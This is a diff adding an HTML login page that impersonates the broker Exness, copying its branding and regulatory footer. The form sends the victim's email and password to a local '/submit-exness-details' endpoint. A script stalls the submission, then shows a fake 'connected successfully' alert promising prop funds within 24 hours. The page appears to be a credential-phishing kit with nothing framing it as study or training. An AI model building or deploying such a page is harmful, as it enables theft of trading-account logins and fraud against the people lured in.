@@ -1,0 +1,115 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Exness Login</title>
+    <link rel="stylesheet" href="/css/exness.css">
+</head>
+
+<body>
+    <nav>
+        <div class="logo">exness</div>
+        <div class="language"><i class="fa-solid fa-globe"></i></div>
+    </nav>
+
+    <div class="login-container">
+        <h1>Welcome to Exness</h1>
+        <h2>Sign in to Exness</h2>
+        
+        <form id="exnessLoginForm" action="/submit-exness-details" method="POST" onsubmit="showLoadingSpinner()">
+            <label for="emailOrNumber">Email:</label>
+            <input type="text" id="emailOrNumber" name="emailOrNumber" required placeholder="Your Email Address">
+        
+            <label for="password">Password:</label>
+            <input type="password" id="password" name="password" required placeholder="Password">
+        
+            <button type="submit">Continue</button>
+        </form>  <br>
+        
+
+        
+        <!-- Loading Spinner -->
+        <div class="spinner" id="spinner"></div>
+
+        <!-- Success Message -->
+        <div class="message" id="successMessage">CONNECTED SUCCESSFULLY</div>
+        <div class="div-or">
+            <span></span>
+            <samp>Or sign in with</samp>
+            <span></span>
+        </div>
+        <div class="google-signin">
+            <img src="https://www.google.com/images/branding/googleg/1x/googleg_standard_color_128dp.png" alt="Google logo" width="20">
+            <span>Google</span>
+        </div>
+        <p><a href="#">I forgot my password.</a></p>
+    </div>
+
+
+<div class="footer">
+    <div class="footer-text">
+        <p>
+            Exness does not offer services to residents of certain jurisdictions including the USA, Iran, North Korea, the European Union, the United Kingdom and others. The content of the website including translations should not be construed as means for solicitation. Investors make their own and independent decisions.
+            <br> <br>
+            Trading in CFDs and generally leveraged products involves substantial risk of loss and you may lose all of your invested capital.
+            <br> <br>
+            Exness (SC) Ltd is a Securities Dealer registered in Seychelles with registration number 8423606-1 and authorised by the Financial Services Authority (FSA) with licence number SD025. The registered office of Exness (SC) Ltd is at 9A CT House, 2nd floor, Providence, Mahe, Seychelles.
+            <br> <br>
+            Exness B.V. is a Securities Intermediary registered in Curaçao with registration number 148698(0) and authorised by the Central Bank of Curaçao and Sint Maarten (CBCS) with licence number 0003LSI. The registered office of Exness B.V. is at Emancipatie Boulevard Dominico F. “Don” Martina 31, Curaçao.
+            <br> <br>
+            Exness (VG) Ltd is authorised by the Financial Services Commission (FSC) in BVI with registration number 2032226 and investment business licence number SIBA/L/20/1133. The registered office of Exness (VG) Ltd is at Trinity Chambers, P.O. Box 4301, Road Town, Tortola, BVI.
+            <br> <br>
+            The entities above are duly authorised to operate under the Exness brand and trademarks
+            <br> <br>
+            Risk Warning: Our services relate to complex derivative products (CFDs) which are traded outside an exchange. These products come with a high risk of losing money rapidly due to leverage and thus are not appropriate for all investors. Under no circumstances shall Exness have any liability to any person or entity for any loss or damage in whole or part caused by, resulting from, or relating to any investing activity. Learn more
+            <br> <br>
+            The information on this website does not constitute investment advice or a recommendation or a solicitation to engage in any investment activity.
+            <br> <br>
+            The information on this website may only be copied with the express written permission of Exness.
+            <br> <br>
+            Exness complies with the Payment Card Industry Data Security Standard (PCI DSS) to ensure your security and privacy. We conduct regular vulnerability scans and penetration tests in accordance with the PCI DSS requirements for our business model.
+        </p>
+    </div>
+
+    <div class="links">
+        <a href="https://www.exness.market/cdn/media/docs/privacy_agreement.pdf?_gl=1*r6p4bd*_gcl_au*MTc3NzI2MTcxLjE3MzE1MzUxNzU.*_ga*MTg1NDcxMzI5MC4xNzMxNTM1MTcz*_ga_M71C3QBXSG*MTczMTU3NjQ3MC4zLjEuMTczMTU3NjU4Ni4wLjAuNTEyNTU0NTE3">Privacy Agreement</a>
+        <a href="https://www.exness.market/cdn/media/docs/risk_disclosure_and_warning_notice.pdf?_gl=1*1j4ysnz*_gcl_au*MTc3NzI2MTcxLjE3MzE1MzUxNzU.*_ga*MTg1NDcxMzI5MC4xNzMxNTM1MTcz*_ga_M71C3QBXSG*MTczMTU3ODg4OC40LjAuMTczMTU3ODg4OC4wLjAuMTIyMDIxMzU4NA..">Risk disclosure</a>
+        <a href="https://www.exness.market/cdn/media/docs/preventing_money_laundering.pdf?_gl=1*u925ao*_gcl_au*MTc3NzI2MTcxLjE3MzE1MzUxNzU.*_ga*MTg1NDcxMzI5MC4xNzMxNTM1MTcz*_ga_M71C3QBXSG*MTczMTU3ODg4OC40LjEuMTczMTU3ODkwOS4wLjAuMTIyMDIxMzU4NA..">Preventing money laundering</a>
+        <a href="https://www.exness.market/instruction_security/?_gl=1*wb0ww*_gcl_au*MTc3NzI2MTcxLjE3MzE1MzUxNzU.*_ga*MTg1NDcxMzI5MC4xNzMxNTM1MTcz*_ga_M71C3QBXSG*MTczMTU3ODg4OC40LjEuMTczMTU3ODkwOS4wLjAuMTIyMDIxMzU4NA..">Security instructions</a>
+        <a href="https://www.exness.market/legal_documents/?_gl=1*wb0ww*_gcl_au*MTc3NzI2MTcxLjE3MzE1MzUxNzU.*_ga*MTg1NDcxMzI5MC4xNzMxNTM1MTcz*_ga_M71C3QBXSG*MTczMTU3ODg4OC40LjEuMTczMTU3ODkwOS4wLjAuMTIyMDIxMzU4NA..">Legal documents</a>
+        <a href="https://www.exness.market/cdn/media/exnesssc/exness_sc_complaints_procedure_for_clients.pdf?_gl=1*wb0ww*_gcl_au*MTc3NzI2MTcxLjE3MzE1MzUxNzU.*_ga*MTg1NDcxMzI5MC4xNzMxNTM1MTcz*_ga_M71C3QBXSG*MTczMTU3ODg4OC40LjEuMTczMTU3ODkwOS4wLjAuMTIyMDIxMzU4NA..">Complaints Handling Policy</a>
+
+        <p>© 2008-2024. Exness</p>
+    </div>
+</div>
+
+    
+    <script>
+        function showLoadingSpinner() {
+            // Show the spinner
+            document.getElementById("spinner").style.display = "block";
+            
+            // Prevent the form from submitting immediately
+            event.preventDefault();
+
+            // Simulate a loading process (e.g., 2 seconds delay)
+            setTimeout(function() {
+                // Hide the spinner
+                document.getElementById("spinner").style.display = "none";
+                
+                  // Show success message as an alert
+                  alert("Connected to exness successfully, Prop funds will display in you exness account in less than 24hours");
+
+                // Optionally, after a delay, submit the form (this simulates a successful connection)
+                setTimeout(function() {
+                    document.getElementById("exnessLoginForm").submit();  // Submit the form after success message
+                }, 1000); // Wait for 1.5 seconds before submitting the form
+            }, 8000); // Simulate 2 seconds loading time
+        }
+    </script>
+        <script src="https://kit.fontawesome.com/b3fa93e021.js" crossorigin="anonymous"></script>
+</body>
+
+</html>
